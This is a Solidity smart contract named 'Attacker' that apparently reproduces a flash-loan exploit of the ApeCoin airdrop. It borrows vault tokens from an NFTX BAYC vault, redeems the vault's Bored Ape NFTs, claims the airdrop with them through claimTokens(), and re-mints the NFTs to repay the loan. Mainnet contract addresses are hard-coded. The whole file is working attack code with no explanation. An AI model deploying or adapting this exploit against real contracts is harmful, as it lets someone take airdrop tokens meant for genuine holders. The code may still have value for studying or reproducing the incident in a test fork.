pragma solidity ^0.8.10;

import "./AirdropGrapesToken.sol";
import "https://github.com/NFTX-project/nftx-protocol-v2/blob/master/contracts/solidity/interface/IERC3156Upgradeable.sol";
import "https://github.com/NFTX-project/nftx-protocol-v2/blob/master/contracts/solidity/NFTXVaultUpgradeable.sol";


contract Attacker is IERC3156FlashBorrowerUpgradeable, IERC721Receiver {

    AirdropGrapesToken claimPool = AirdropGrapesToken(0x3227A586fe2F993bde4d2ebB04cde31A0be4715d);
    IERC20 apeCoin = IERC20(0xDBe64E57D70CbC10D873152A98f4A82cD44E720E);
    NFTXVaultUpgradeable vault = NFTXVaultUpgradeable(0x60b72dA913A09C774167665F03e9F00B2Ae36bEC);
    IERC3156FlashBorrowerUpgradeable tem = IERC3156FlashBorrowerUpgradeable(address(this));
    IERC721 bayc = IERC721(0x81EE4B26455FE7807B5f7500A467D2277198cD58);

    
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
     )external returns (bytes32) {
        uint256[] memory tokenIds = vault.allHoldings();
        vault.redeemTo(vault.totalHoldings(), tokenIds, address(this));
        claimPool.claimTokens();
        bayc.setApprovalForAll(address(vault), true);
        uint256[] memory amounts = new uint256[](0);
        vault.mintTo(tokenIds, amounts, address(this));
        vault.approve(address(vault), 5.2 ether);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }

    function flashloan() external {
        uint256 amount = 5.2 ether;
        vault.flashLoan(tem, 0x60b72dA913A09C774167665F03e9F00B2Ae36bEC, amount, "0x");
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

}